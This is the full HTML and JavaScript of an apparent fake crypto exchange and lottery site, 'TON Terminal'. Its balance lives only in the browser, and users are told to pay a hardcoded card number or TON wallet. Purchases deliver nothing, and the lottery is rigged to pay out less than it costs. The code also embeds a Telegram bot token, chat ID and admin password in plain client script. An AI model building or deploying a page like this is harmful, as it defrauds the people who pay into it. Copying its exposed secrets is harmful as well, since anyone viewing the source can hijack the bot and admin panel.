<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Terminal ‚Äî Elite Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
        body { background-color: #05080f; color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .glass { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(14px); border: 1px solid rgba(255,255,255,0.05); }
        .input-box { background: rgba(30, 41, 59, 0.5); border: 1px solid rgba(255,255,255,0.1); }
        .buy-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); transition: all 0.3s; }
        .buy-btn:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(16, 185, 129, 0.3); }
        .nav-tab.active { background: rgba(59, 130, 246, 0.2); border: 1px solid #3b82f6; color: #3b82f6; }
        
        /* –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å—Ç–∏–ª—è –≤—ã–ø–∞–¥–∞—é—â–µ–≥–æ —Å–ø–∏—Å–∫–∞ (Shop UI Fix) */
        select { -webkit-appearance: none; -moz-appearance: none; appearance: none; background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e"); background-repeat: no-repeat; background-position: right 1rem center; background-size: 1em; }
        select option { background-color: #0f172a !important; color: white !important; }

        /* –ö–∞—Å—Ç–æ–º–Ω—ã–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è */
        #notify-toast { transform: translateY(-150%); transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        #notify-toast.show { transform: translateY(20px); }

        /* –õ–æ—Ç–µ—Ä–µ—è: –∞–Ω–∏–º–∞—Ü–∏–∏ */
        @keyframes intense-shake { 0%, 100% { transform: translateX(0); } 20% { transform: translateX(-10px) rotate(-3deg); } 40% { transform: translateX(10px) rotate(3deg); } 60% { transform: translateX(-10px); } 80% { transform: translateX(10px); } }
        .box-shake { animation: intense-shake 0.15s infinite; }
        .reveal-anim { animation: zoomIn 0.5s both; }
        @keyframes zoomIn { from { opacity: 0; transform: scale(0.5); } to { opacity: 1; transform: scale(1); } }
    </style>
</head>
<body class="min-h-screen pb-20">

    <div id="notify-toast" class="fixed top-0 left-0 right-0 z-[1000] flex justify-center pointer-events-none">
        <div class="glass border-blue-500/30 px-6 py-4 rounded-2xl shadow-2xl flex items-center gap-3">
            <div id="notify-icon" class="text-xl">üîî</div>
            <div id="notify-msg" class="text-sm font-bold uppercase tracking-tight">–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!</div>
        </div>
    </div>

    <nav class="border-b border-white/5 py-4 px-4 md:px-8 flex justify-between items-center glass sticky top-0 z-50">
        <div class="flex items-center gap-2 cursor-pointer" onclick="handleLogoClick()">
            <span class="text-lg font-extrabold italic uppercase tracking-tighter">Ton<span class="text-blue-500">Terminal</span></span>
        </div>
        <div class="flex items-center gap-3">
            <div class="text-right glass px-4 py-1.5 rounded-xl border border-white/10">
                <p class="text-[7px] uppercase text-slate-500 font-black">–ë–∞–ª–∞–Ω—Å</p>
                <p id="balance-display" class="text-sm font-black text-green-400">4600.00 –≥—Ä–Ω</p>
            </div>
            <button onclick="openModal('deposit-modal')" class="bg-blue-600 hover:bg-blue-500 p-2 rounded-lg transition-all shadow-lg shadow-blue-600/20">‚ûï</button>
        </div>
    </nav>

    <main class="max-w-7xl mx-auto p-4 md:p-8 relative z-10">
        <div class="flex justify-center gap-4 mb-8">
            <button onclick="showTab('main')" id="btn-main" class="nav-tab active glass px-8 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üè† –ú–∞—Ä–∫–µ—Ç</button>
            <button onclick="showTab('shop')" id="btn-shop" class="nav-tab glass px-8 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üõçÔ∏è –ú–∞–≥–∞–∑</button>
            <button onclick="showTab('lotto')" id="btn-lotto" class="nav-tab glass px-8 py-3 rounded-2xl text-[10px] font-black uppercase transition-all">üéÅ –õ–æ—Ç–æ</button>
        </div>

        <div id="view-main" class="space-y-6">
            <div class="glass p-6 rounded-[2.5rem]">
                <div id="tradingview_widget" class="h-[450px] w-full rounded-2xl overflow-hidden"></div>
            </div>
            <div class="glass p-8 rounded-[2.5rem] border border-blue-500/10">
                <h3 class="text-lg font-black uppercase mb-6 text-center italic">üîÑ –ú–≥–Ω–æ–≤–µ–Ω–Ω–∞—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è USD</h3>
                <div class="max-w-md mx-auto mb-8">
                    <div class="input-box p-4 rounded-2xl flex items-center border border-white/10">
                        <span class="text-2xl mr-4 opacity-30">$</span>
                        <input type="number" id="conv-usd" value="500" class="bg-transparent text-3xl font-bold outline-none w-full text-blue-400" oninput="runGlobalConvert()">
                    </div>
                </div>
                <div id="conv-results" class="grid grid-cols-2 md:grid-cols-4 gap-4"></div>
            </div>
        </div>

        <div id="view-shop" class="hidden">
            <div class="max-w-2xl mx-auto glass p-8 rounded-[3rem]">
                <h3 class="text-2xl font-black uppercase mb-8 text-center italic text-blue-500 tracking-tighter">–ö—É–ø–∏—Ç—å –∫—Ä–∏–ø—Ç—É</h3>
                <div class="space-y-4">
                    <div class="space-y-2">
                        <label class="text-[9px] text-slate-500 uppercase font-black ml-4">–ê—Å—Å–µ—Ç</label>
                        <select id="shop-coin-select" class="w-full bg-[#0f172a] border border-white/10 p-5 rounded-2xl text-sm font-bold outline-none text-white cursor-pointer" onchange="updateShopRate()">
                            <option value="TON">TON (Toncoin)</option>
                            <option value="BTC">BTC (Bitcoin)</option>
                            <option value="ETH">ETH (Ethereum)</option>
                            <option value="SOL">SOL (Solana)</option>
                            <option value="TRX">TRX (TRON)</option>
                        </select>
                    </div>
                    <div class="input-box p-5 rounded-2xl">
                        <label class="text-[9px] text-slate-500 uppercase font-black block">–°—É–º–º–∞ –ø–æ–∫—É–ø–∫–∏</label>
                        <input type="number" id="shop-qty" value="1" class="bg-transparent text-2xl font-bold outline-none w-full" oninput="updateShopRate()">
                    </div>
                    <div id="shop-total" class="text-center p-6 bg-blue-500/5 border border-blue-500/10 rounded-2xl text-3xl font-black text-green-400">0.00 –≥—Ä–Ω</div>
                    <button onclick="processFinalPurchase()" class="buy-btn w-full py-5 rounded-2xl font-black text-sm uppercase shadow-2xl">–û—Ñ–æ—Ä–º–∏—Ç—å –∑–∞—è–≤–∫—É</button>
                </div>
            </div>
        </div>

        <div id="view-lotto" class="hidden">
            <div class="glass p-12 rounded-[4rem] text-center max-w-2xl mx-auto">
                <div id="lotto-stage">
                    <h2 class="text-4xl font-black mb-8 uppercase italic tracking-tighter">Mega <span class="text-blue-500">Box</span></h2>
                    <div id="box-anim" class="text-[12rem] my-10 cursor-pointer transition-transform duration-300">üéÅ</div>
                    <button onclick="playLotto()" id="lotto-btn" class="buy-btn px-16 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl">–û—Ç–∫—Ä—ã—Ç—å –∑–∞ 350 –≥—Ä–Ω</button>
                </div>
                <div id="prize-reveal" class="hidden flex-col items-center py-10 reveal-anim">
                    <div id="prize-icon" class="text-9xl mb-6">üíé</div>
                    <div id="prize-value" class="text-6xl font-black text-yellow-500 mb-8">0 –≥—Ä–Ω</div>
                    <button onclick="resetLotto()" class="text-[10px] font-bold uppercase text-slate-500 hover:text-white transition-colors">–ò—Å–ø—ã—Ç–∞—Ç—å —É–¥–∞—á—É –µ—â–µ —Ä–∞–∑</button>
                </div>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-black/98 z-[600] hidden flex-col items-center justify-center p-6 backdrop-blur-3xl">
        <div class="glass p-8 rounded-[3rem] w-full max-w-lg border-red-500/20">
            <h3 class="text-2xl font-black uppercase mb-8 text-center text-red-500 italic">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–ª–∞—Ç–µ–∂–µ–π</h3>
            <div id="pending-list" class="space-y-4 max-h-[400px] overflow-y-auto mb-8 pr-2"></div>
            <button onclick="closeModal('admin-panel')" class="w-full text-slate-500 font-bold uppercase text-[9px]">–ó–∞–∫—Ä—ã—Ç—å –¥–æ—Å—Ç—É–ø</button>
        </div>
    </div>

    <div id="deposit-modal" class="fixed inset-0 bg-black/95 z-[500] hidden items-center justify-center p-4">
        <div class="glass p-10 rounded-[3rem] max-w-sm w-full text-center">
            <h3 class="text-xl font-black uppercase mb-8 text-blue-500">–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å</h3>
            <div class="input-box p-4 rounded-2xl mb-6">
                <input type="number" id="dep-input" value="100" class="bg-transparent w-full text-2xl font-bold outline-none text-center">
            </div>
            <div class="flex gap-3 mb-8">
                <button onclick="showDetails('Card')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all">–ö–∞—Ä—Ç–∞ UA</button>
                <button onclick="showDetails('Crypto')" class="flex-1 bg-white/5 border border-white/5 p-4 rounded-xl text-[10px] font-bold uppercase hover:bg-blue-600 transition-all">TON Wallet</button>
            </div>
            <div id="pay-details" class="hidden bg-blue-500/10 p-4 rounded-2xl mb-8 text-left border border-blue-500/20 text-[10px] font-mono break-all bg-black/40"></div>
            <button onclick="confirmDeposit()" class="w-full buy-btn py-4 rounded-2xl font-black text-xs uppercase text-white">–Ø –æ–ø–ª–∞—Ç–∏–ª</button>
            <button onclick="closeModal('deposit-modal')" class="w-full mt-4 text-slate-600 text-[10px] font-black uppercase">–û—Ç–º–µ–Ω–∞</button>
        </div>
    </div>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const TG_TOKEN = "8357376946:AAHbffgk6JY0Ip3yJ3yOGpTaG-_HZ7gjJZw";
        const TG_CHAT_ID = "5252821529";
        const ADMIN_PASS = "1580Q4514"; // –¢–≤–æ–π –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å
        
        let balance = 4600.00;
        let rates = {};
        let clickCount = 0;
        let pendingDeposits = JSON.parse(localStorage.getItem('pending_list')) || [];

        // –ö–∞—Å—Ç–æ–º–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ (–í–º–µ—Å—Ç–æ Alert)
        function showNotify(text, icon = 'üîî') {
            const toast = document.getElementById('notify-toast');
            document.getElementById('notify-msg').innerText = text;
            document.getElementById('notify-icon').innerText = icon;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        // –í—Ö–æ–¥ –≤ –∞–¥–º–∏–Ω–∫—É
        function handleLogoClick() {
            clickCount++;
            if (clickCount >= 3) {
                if (prompt("ADMIN KEY:") === ADMIN_PASS) {
                    renderAdminPanel();
                    openModal('admin-panel');
                }
                clickCount = 0;
            }
            setTimeout(() => { clickCount = 0; }, 2000);
        }

        function renderAdminPanel() {
            const list = document.getElementById('pending-list');
            list.innerHTML = pendingDeposits.length ? pendingDeposits.map((dep, i) => `
                <div class="bg-white/5 p-5 rounded-2xl border border-white/5 flex justify-between items-center">
                    <div class="text-lg font-black text-green-400">${dep.amount} –≥—Ä–Ω</div>
                    <button onclick="approveDep(${i})" class="bg-green-600 px-6 py-2 rounded-xl font-black text-[10px] uppercase">–û–¥–æ–±—Ä–∏—Ç—å</button>
                </div>
            `).join('') : '<p class="text-center text-slate-500 text-xs italic">–ù–æ–≤—ã—Ö –æ–ø–ª–∞—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω–æ</p>';
        }

        function approveDep(idx) {
            balance += parseFloat(pendingDeposits[idx].amount);
            pendingDeposits.splice(idx, 1);
            localStorage.setItem('pending_list', JSON.stringify(pendingDeposits));
            updateUI(); renderAdminPanel();
            showNotify("–ë–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ!", "‚úÖ");
        }

        async function fetchRates() {
            try {
                const res = await fetch('https://api.binance.com/api/v3/ticker/price');
                const data = await res.json();
                ['TONUSDT', 'BTCUSDT', 'ETHUSDT', 'SOLUSDT', 'TRXUSDT'].forEach(s => {
                    const found = data.find(d => d.symbol === s);
                    if(found) rates[s.replace('USDT', '')] = parseFloat(found.price);
                });
                runGlobalConvert(); updateShopRate();
            } catch(e) {}
        }

        function runGlobalConvert() {
            const usd = parseFloat(document.getElementById('conv-usd').value) || 0;
            const container = document.getElementById('conv-results');
            container.innerHTML = Object.keys(rates).map(coin => `
                <div class="bg-white/5 p-4 rounded-xl border border-white/5 text-center">
                    <p class="text-[8px] uppercase text-slate-500 font-bold mb-1">${coin}</p>
                    <p class="text-sm font-black text-blue-400">${(usd/rates[coin]).toFixed(4)}</p>
                </div>`).join('');
        }

        function updateShopRate() {
            const coin = document.getElementById('shop-coin-select').value;
            const qty = parseFloat(document.getElementById('shop-qty').value) || 0;
            if(rates[coin]) document.getElementById('shop-total').innerText = (qty * rates[coin] * 42.5 * 1.075).toFixed(2) + " –≥—Ä–Ω";
        }

        function updateUI() {
            document.getElementById('balance-display').innerText = balance.toFixed(2) + " –≥—Ä–Ω";
        }

        function confirmDeposit() {
            const amt = document.getElementById('dep-input').value;
            if(amt < 100) return showNotify("–ú–∏–Ω–∏–º—É–º 100 –≥—Ä–Ω!", "‚ùå");
            pendingDeposits.push({ amount: amt });
            localStorage.setItem('pending_list', JSON.stringify(pendingDeposits));
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("üí∞ –î–ï–ü–û–ó–ò–¢: " + amt + " –≥—Ä–Ω")}`);
            closeModal('deposit-modal');
            showNotify("–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω—É!", "‚è≥");
        }

        function playLotto() {
            if (balance < 350) return showNotify("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤!", "‚ùå");
            balance -= 350; updateUI();
            
            const box = document.getElementById('box-anim');
            const stage = document.getElementById('lotto-stage');
            const reveal = document.getElementById('prize-reveal');
            
            box.classList.add('box-shake');
            document.getElementById('lotto-btn').disabled = true;

            setTimeout(() => {
                box.classList.remove('box-shake');
                stage.classList.add('hidden');
                reveal.classList.remove('hidden');
                
                const r = Math.random() * 100;
                let win = 0;
                if (r <= 0.000001) win = 2500;
                else if (r <= 0.05) win = 1000;
                else if (r <= 3.0) win = 400;
                else if (r <= 15.0) win = 275;
                else win = 50;

                balance += win; updateUI();
                document.getElementById('prize-value').innerText = win + " –≥—Ä–Ω";
                document.getElementById('prize-icon').innerText = win >= 1000 ? "üëë" : "üéÅ";
                
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("üéâ –í–´–ò–ì–†–´–®: " + win + " –≥—Ä–Ω")}`);
            }, 2500);
        }

        function resetLotto() {
            document.getElementById('lotto-stage').classList.remove('hidden');
            document.getElementById('prize-reveal').classList.add('hidden');
            document.getElementById('lotto-btn').disabled = false;
        }

        function showDetails(m) {
            const d = document.getElementById('pay-details');
            d.classList.remove('hidden');
            d.innerText = m === 'Card' ? "444 1144 3897 8734" : "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz";
        }

        function processFinalPurchase() {
            const uahPrice = parseFloat(document.getElementById('shop-total').innerText);
            if(balance < uahPrice) return showNotify("–ú–∞–ª–æ –±–∞–ª–∞–Ω—Å–∞!", "‚ùå");
            balance -= uahPrice; updateUI();
            showNotify("–ó–∞—è–≤–∫–∞ –ø—Ä–∏–Ω—è—Ç–∞!", "üöÄ");
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("üõí –ö–£–ü–ò–õ–ò –ö–†–ò–ü–¢–£ –Ω–∞ " + uahPrice + " –≥—Ä–Ω")}`);
        }

        function showTab(t) {
            ['main', 'shop', 'lotto'].forEach(v => document.getElementById('view-'+v).classList.toggle('hidden', v !== t));
            ['btn-main', 'btn-shop', 'btn-lotto'].forEach(b => document.getElementById(b).classList.toggle('active', b === 'btn-'+t));
        }

        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }

        setInterval(fetchRates, 30000); fetchRates(); updateUI();
        new TradingView.widget({ "autosize": true, "symbol": "OKX:TONUSDT", "interval": "H", "theme": "dark", "container_id": "tradingview_widget", "backgroundColor": "#05080f" });
    </script>
</body>
</html>
